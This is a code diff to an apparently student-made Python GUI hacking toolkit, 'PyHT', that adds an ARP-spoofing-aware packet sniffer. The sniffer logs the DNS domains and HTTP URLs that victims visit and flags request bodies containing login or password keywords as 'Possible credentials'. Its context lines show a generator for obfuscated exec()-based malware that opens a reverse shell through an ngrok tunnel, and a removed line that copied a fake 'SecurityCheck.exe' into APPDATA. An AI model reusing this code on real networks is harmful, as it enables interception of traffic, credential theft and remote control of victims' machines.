@@ -1,6 +1,7 @@
 import customtkinter as ctk
 import socket,threading,netifaces,requests,time,subprocess,re,signal,sys,os,webbrowser,ast
 import scapy.all as scapy
+from scapy.layers import http
 from PIL import Image, ImageTk
 from concurrent.futures import ThreadPoolExecutor
 from CTkMessagebox import CTkMessagebox
@@ -29,7 +30,13 @@ class Program(ctk.CTk):
         self.c2_powershell_mode=False
         self.listening=False
         self.active_client=False
-        self.title("RieiroTFG")
+        self.sniffing=False
+        self.sniffing_dns=False
+        self.sniffing_http=False
+        self.first_sniffing=False
+        self.first_sniffing_dns=False
+        self.first_sniffing_http=False
+        self.title("PyHT")
         self.geometry("1100x500")
         ctk.set_default_color_theme("dark-blue")
         ctk.set_appearance_mode("dark")
@@ -65,6 +72,7 @@ class Program(ctk.CTk):
         self.command=ctk.StringVar()
         self.function=ctk.StringVar()
         self.victim=ctk.StringVar()
+        self.interface_sniffer=ctk.StringVar()
         signal.signal(signal.SIGINT, self.def_handler) 
 
 
@@ -351,7 +359,7 @@ class Program(ctk.CTk):
         scanner_button=ctk.CTkButton(arp_frame,text="  ARP Scanner ", width=100,height=50,corner_radius=80,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),border_width=2,border_color="red",command=self.arp_scanner)
         scanner_button.place(x=50,y=70)
 
-        poison_button=ctk.CTkButton(arp_frame,text="  ARP Poisoning", width=100,height=50,corner_radius=80,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),border_width=2,border_color="red",command=self.arp_poison)
+        poison_button=ctk.CTkButton(arp_frame,text="  ARP Spoofing", width=100,height=50,corner_radius=80,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),border_width=2,border_color="red",command=self.arp_poison)
         poison_button.place(x=390,y=70)
 
         flood_button=ctk.CTkButton(arp_frame,text="󱪁  ARP Flooding", width=100,height=50,corner_radius=80,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),border_width=2,border_color="red",command=self.arp_flooding)
@@ -608,7 +616,7 @@ class Program(ctk.CTk):
         scan_button.place(x=420,y=80)
 
     
-        spoof_button=ctk.CTkButton(self.spoof_frame,text=" POISON" ,width=50,height=50,corner_radius=80,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),border_width=2,border_color="red",command=self.spoof_thread)
+        spoof_button=ctk.CTkButton(self.spoof_frame,text=" SPOOF" ,width=50,height=50,corner_radius=80,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),border_width=2,border_color="red",command=self.spoof_thread)
         spoof_button.place(x=265,y=150)
 
 ## Stop Button
@@ -664,7 +672,7 @@ class Program(ctk.CTk):
                 scapy.send(arp_packet, verbose=False)
                 scapy.send(arp_packet_gateway, verbose=False)
 
-                self.spoof_terminal.insert("0.0",f"\n Poisoning {ip} with {actual_mac}...")
+                self.spoof_terminal.insert("0.0",f"\n Spoofing {ip} with {actual_mac}...")
                 self.spoof_terminal.see("end")
 
             time.sleep(2)  
@@ -830,10 +838,215 @@ class Program(ctk.CTk):
 ## Sniffer Menu
 
     def sniffer_tools(self):
-      self.destroy_labels()
-      self.sniffer_active=True
-      self.sniffer_active_label=ctk.CTkLabel(self,text="",fg_color="black",text_color="yellow",bg_color="black",font=("Hack Nerd Font",30))
-      self.sniffer_active_label.place(x=30,y=270)
+        self.destroy_labels()
+        self.sniffer_active=True
+        self.sniffer_active_label=ctk.CTkLabel(self,text="",fg_color="black",text_color="yellow",bg_color="black",font=("Hack Nerd Font",30))
+        self.sniffer_active_label.place(x=30,y=270)
+
+
+        self.sniffer_frame=ctk.CTkFrame(self,width=680,height=400, fg_color="#171717",bg_color="#171717")
+        self.sniffer_frame.place(x=360,y=50)
+        self.sniffer_terminal=ctk.CTkTextbox(self.sniffer_frame,width=600,height=230, fg_color="black",bg_color="black",text_color="#32C305",font=("Hack Nerd Font",13))
+        self.sniffer_terminal.place(x=40,y=135)
+        self.sniffer_terminal.configure(state="disabled")
+
+
+        if self.spoofing:
+            spoofing_label=ctk.CTkLabel(self.sniffer_frame,text="Spoofing Active",fg_color="#171717",text_color="green",bg_color="#171717",font=("Hack Nerd Font",15))
+            spoofing_label.place(x=40,y=30)
+        else:
+            spoofing_label=ctk.CTkLabel(self.sniffer_frame,text="Spoofing Inactive",fg_color="#171717",text_color="red",bg_color="#171717",font=("Hack Nerd Font",15))
+            spoofing_label.place(x=40,y=30)
+
+
+        if self.interface_sniffer not in scapy.get_if_list():
+            interfaces_text=ctk.CTkLabel(self.sniffer_frame,text="Available interfaces",font=("Hack Nerd Font",15),fg_color="#171717",bg_color="#171717",text_color="red")
+            interfaces_text.place(x=230,y=30)
+            interfaces_list=ctk.CTkOptionMenu(self.sniffer_frame,values=scapy.get_if_list(),variable=self.interface_sniffer,width=183,height=30,fg_color="black",bg_color="black",text_color="#32C305",font=("Hack Nerd Font",15),button_color="red",button_hover_color="#62090C",dropdown_fg_color="#4D0000",dropdown_text_color="green",dropdown_font=("Hack Nerd Font",15),command=self.sniffer_sniff)
+            interfaces_list.place(x=440,y=30)
+        else:
+            interfaces_text=ctk.CTkLabel(self.sniffer_frame,text="Interface selected",font=("Hack Nerd Font",15),fg_color="#171717",bg_color="#171717",text_color="red")
+            interfaces_text.place(x=230,y=30)
+            interfaces_selected=ctk.CTkLabel(self.sniffer_frame,text=self.interface_sniffer,font=("Hack Nerd Font",15),fg_color="#171717",bg_color="#171717",text_color="green")
+            interfaces_selected.place(x=440,y=30)
+    
+
+        stop_sniffing=ctk.CTkButton(self.sniffer_frame,text="󰝤" ,width=50,height=20,fg_color="white",text_color="red",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),border_width=2,border_color="#171717",command=self.stop_sniffing)
+        stop_sniffing.place(x=40,y=100)
+        
+        resume_sniffing=ctk.CTkButton(self.sniffer_frame,text="" ,width=50,height=20,fg_color="white",text_color="green",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),border_width=2,border_color="#171717",command=self.resume_sniffing)
+        resume_sniffing.place(x=92,y=100)
+
+
+        dns_sniffing=ctk.CTkButton(self.sniffer_frame,text="󰈶 DNS FILTER",width=50,height=34,fg_color="purple",text_color="white",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),border_width=2,border_color="#171717",command=self.sniffer_dns)
+        dns_sniffing.place(x=160,y=100)
+
+
+        http_sniffing=ctk.CTkButton(self.sniffer_frame,text="󰈶 HTTP FILTER",width=50,height=34,fg_color="GREEN",text_color="white",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),border_width=2,border_color="#171717",command=self.sniffer_http)
+        http_sniffing.place(x=320,y=100)
+
+        normal_sniffing=ctk.CTkButton(self.sniffer_frame,text="󰈶 NO FILTER",width=50,height=34,fg_color="GRAY",text_color="white",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),border_width=2,border_color="#171717",command=self.sniffer_no)
+        normal_sniffing.place(x=495,y=100)
+
+
+    def sniffer_sniff(self, selected_interface):
+        self.sniffing=True
+        self.sniffing_http=False
+        self.sniffing_dns=False
+        self.latest_sniffing="Normal"
+        self.sniffer_terminal.configure(state="normal")
+        self.sniffer_terminal.delete("0.0", "end")
+        self.sniffer_terminal.configure(state="disabled")
+        self.interface_sniffer = selected_interface 
+        if not self.first_sniffing and self.interface_sniffer in scapy.get_if_list():
+            self.first_sniffing=True
+            thread = threading.Thread(
+                target=lambda: scapy.sniff(
+                iface=self.interface_sniffer,
+                prn=self.process_packet,
+                store=0
+                ),
+            daemon=True
+            )
+            thread.start()
+
+
+    def process_packet(self, packet):
+        if self.sniffing:
+            self.sniffer_terminal.configure(state="normal")
+            self.sniffer_terminal.insert("end", f"\n {packet.summary()}...")
+            time.sleep(0.1)
+            self.sniffer_terminal.see("end")
+            self.sniffer_terminal.configure(state="disabled")
+
+
+    def sniffer_no(self):
+        self.sniffing=True
+        self.sniffing_http=False
+        self.sniffing_dns=False
+        self.latest_sniffing="Normal"
+        self.sniffer_terminal.configure(state="normal")
+        self.sniffer_terminal.delete("0.0", "end")
+        self.sniffer_terminal.configure(state="disabled")
+        if not self.first_sniffing and self.interface_sniffer in scapy.get_if_list():
+            self.first_sniffing=True
+            thread = threading.Thread(
+                target=lambda: scapy.sniff(
+                iface=self.interface_sniffer,
+                prn=self.process_packet,
+                store=0
+                ),
+            daemon=True
+            )
+            thread.start()
+
+
+    def sniffer_dns(self):
+        self.sniffing=False
+        self.sniffing_http=False
+        self.sniffing_dns=True
+        self.domains_seen=set()
+        self.latest_sniffing="DNS"
+        self.sniffer_terminal.configure(state="normal")
+        self.sniffer_terminal.delete("0.0", "end")
+        self.sniffer_terminal.configure(state="disabled")
+        if not self.first_sniffing_dns and self.interface_sniffer in scapy.get_if_list():
+            self.first_sniffing_dns=True
+            thread = threading.Thread(
+                target=lambda: scapy.sniff(
+                iface=self.interface_sniffer,
+                filter="udp and port 53", 
+                prn=self.process_dns_packet,
+                store=0
+                ),
+            daemon=True
+            )
+            thread.start()
+
+
+    def process_dns_packet(self,packet):
+
+        if self.sniffing_dns:
+            if packet.haslayer(scapy.DNSQR): 
+                domain = packet[scapy.DNSQR].qname.decode() 
+
+                exclude_keywords=["google", "cloud", "bing", "static"] 
+
+            if domain not in self.domains_seen and not any(keyword in domain for keyword in exclude_keywords):
+                self.domains_seen.add(domain) 
+                self.sniffer_terminal.configure(state="normal")
+                self.sniffer_terminal.insert("end",f"\n Domain: {domain}")
+                self.sniffer_terminal.see("end")
+                self.sniffer_terminal.configure(state="disabled")
+
+
+    def sniffer_http(self):
+        self.sniffing=False
+        self.sniffing_http=True
+        self.sniffing_dns=False
+        self.domains_seen=set()
+        self.latest_sniffing="HTTP"
+        self.sniffer_terminal.configure(state="normal")
+        self.sniffer_terminal.delete("0.0", "end")
+        self.sniffer_terminal.configure(state="disabled")
+        
+        if not self.first_sniffing_http and self.interface_sniffer in scapy.get_if_list():
+            self.first_sniffing_http=True
+            thread = threading.Thread(
+                target=lambda: scapy.sniff(
+                iface=self.interface_sniffer,
+                prn=self.process_http_packet,
+                store=0
+                ),
+            daemon=True
+            )
+            thread.start()
+
+
+    def process_http_packet(self,packet):
+        if self.sniffing_http:
+            cred_keywords=["pass", "login","user","mail"] 
+
+            if packet.haslayer(http.HTTPRequest):
+                url= "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode() 
+                self.sniffer_terminal.configure(state="normal")
+                self.sniffer_terminal.insert("end",f"\n URL visited: {url}")
+                self.sniffer_terminal.see("end")
+                self.sniffer_terminal.configure(state="disabled")
+
+
+                if packet.haslayer(scapy.Raw):
+                    try:
+                        response=packet[scapy.Raw].load.decode() 
+                        for keyword in cred_keywords:
+                            if keyword in response:
+                                self.sniffer_terminal.configure(state="normal")
+                                self.sniffer_terminal.insert("end",f"\n Possible credentials: {response}")
+                                self.sniffer_terminal.see("end")
+                                self.sniffer_terminal.configure(state="disabled")
+                                break
+                    except:
+                        pass
+
+
+    def stop_sniffing(self):
+        self.sniffing=False
+        self.sniffing_dns=False
+        self.sniffing_http=False
+
+
+    def resume_sniffing(self):
+        self.sniffer_terminal.configure(state="normal")
+        self.sniffer_terminal.delete("0.0", "end")
+        self.sniffer_terminal.configure(state="disabled")
+        if self.latest_sniffing == "Normal":
+            self.sniffing=True
+        elif self.latest_sniffing == "DNS":
+            self.sniffing_dns=True
+        elif self.latest_sniffing == "HTTP":
+            self.sniffing_http=True
+
+
 
 
 #############################
@@ -1843,7 +2056,7 @@ class Program(ctk.CTk):
             port = public_url.split(":")[1]
 
             vnc_address=ip+":"+port
-            vnc_command=f"vncviewer {vnc_address} -passwd scripts/passwd"
+            vnc_command=f"vncviewer {vnc_address} -passwd scripts/passwd -DotWhenNoCursor"
         except:
             result="Error ngrok service could not be started"+"\n\n"
             self.c2_command_terminal.delete(0,"end")
@@ -2907,38 +3120,6 @@ class Program(ctk.CTk):
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
     def c2_show_popup_window(self):
         dialog = ctk.CTkInputDialog(text="Type the message from the pop-up window:", title="Pop-Up Window",button_fg_color="red",fg_color="black",button_hover_color="#62090C",entry_text_color="#EEEFF0",button_text_color="#EEEFF0")
         popup_message = dialog.get_input()  
@@ -3491,7 +3672,6 @@ class Program(ctk.CTk):
       malware += 'exec("def a(b):\\n  if b.startswith(\\\"cd \\\" ):\\n    c=b.split(\\\" \\", 1)[1]; os.chdir(c); return \\"Changed directory to \\"+os.getcwd()+\\\"\\\\n\\\"\\n  return _ (b).decode(\\\"cp850\\\")")\n'
       malware += 'exec("def b(c):\\n  d = {\\\"Authorization\\\": f\\\"Bearer '+API+'\\\", \\"Ngrok-Version\\\": \\"2\\\"}\\n  while True:\\n    try:\\n      e = requests.get(\\\"https://api.ngrok.com/tunnels\\\", headers=d)\\n      f = e.json()[\\\"tunnels\\\"][0][\\\"public_url\\\"].split(\\\"://\\\")[1]\\n      g = f.split(\\\":\\\")[0]\\n      h = f.split(\\\":\\\")[1]\\n\\n      return g, h\\n    except:\\n      pass\\n      time.sleep(5)")\n'
       malware += 'exec("def c(i,p):\\n  j=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\\n  j.connect((i,int(p)))\\n  while True:\\n    k=j.recv(1024).decode().strip()\\n    try:\\n      j.send(b\\\"\\\\n\\\"+a(k).encode()+b\\\"\\\\n\\\")\\n    except:\\n      j.send(b\\\"\\\\n[!] Error\\\\n\\\\n\\\")\\n  j.close()")\n'
-      malware += 'exec("if __name__ == \\"__main__\\\":\\n  f_p = os.getcwd()\\n  sP = f\\\"{f_p}\\\\\\\\SecurityCheck.exe\\\"\\n  dP = os.path.join(os.getenv(\\\"APPDATA\\\"), \\"SecurityCheck.exe\\\")\\n  if not os.path.exists(dP):\\n    os.makedirs(os.path.dirname(dP), exist_ok=True)\\n    shutil.copy(sP, dP)\\n    pass\\n  else:\\n    pass")\n'
       malware += 'exec("if __name__==\\"__main__\\\":\\n  i,p=b(\\"'+API+'\\")\\n  while True:\\n    try:\\n      c(i,p)\\n    except:\\n      time.sleep(5)\\n      i,p=b(\\"'+API+'\\")")'
 
 
